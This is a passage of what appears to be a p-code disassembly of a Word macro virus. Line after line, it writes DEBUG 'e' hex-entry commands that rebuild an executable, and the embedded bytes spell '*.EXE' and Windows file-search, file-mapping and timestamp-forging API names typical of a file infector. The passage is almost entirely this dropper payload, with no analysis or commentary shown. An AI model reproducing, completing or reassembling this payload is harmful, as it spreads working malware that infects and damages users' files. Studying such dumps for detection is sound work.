' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #65:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #66:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #67:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #68:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #69:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #70:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #71:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #72:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #73:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #74:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #75:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #76:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #77:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #78:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #79:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #80:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #81:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #82:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #83:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #84:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #85:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #86:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #87:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #88:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #89:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #90:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #91:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #92:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #93:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #94:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #95:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #96:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #97:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #98:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #99:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #100:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #101:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #102:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0700 e9 29 08 00 00 2a 2e 58 45 58 00 47 65 74 50 72 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #103:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0710 6f 63 41 64 64 72 65 73 73 00 45 78 69 74 50 72 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #104:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0720 6f 63 65 73 73 00 46 69 6e 64 46 69 72 73 74 46 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #105:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0730 69 6c 65 41 00 46 69 6e 64 4e 65 78 74 46 69 6c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #106:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0740 65 41 00 47 65 74 43 75 72 72 65 6e 74 44 69 72 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #107:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0750 65 63 74 6f 72 79 41 00 43 72 65 61 74 65 46 69 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #108:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0760 6c 65 4d 61 70 70 69 6e 67 41 00 4d 61 70 56 69 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #109:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0770 65 77 4f 66 46 69 6c 65 00 55 6e 6d 61 70 56 69 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #110:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0780 65 77 4f 66 46 69 6c 65 00 47 65 74 46 69 6c 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #111:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0790 41 74 74 72 69 62 75 74 65 73 41 00 53 65 74 46 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #112:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07a0 69 6c 65 41 74 74 72 69 62 75 74 65 73 41 00 47 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #113:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07b0 65 74 44 72 69 76 65 54 79 70 65 41 00 43 72 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #114:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07c0 61 74 65 46 69 6c 65 41 00 43 6c 6f 73 65 48 61 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #115:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07d0 6e 64 6c 65 00 47 65 74 46 69 6c 65 54 69 6d 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #116:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07e0 00 53 65 74 46 69 6c 65 54 69 6d 65 00 53 65 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #117:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07f0 46 69 6c 65 50 6f 69 6e 74 65 72 00 47 65 74 46 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #118:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0800 69 6c 65 53 69 7a 65 00 53 65 74 45 6e 64 4f 66 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #119:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
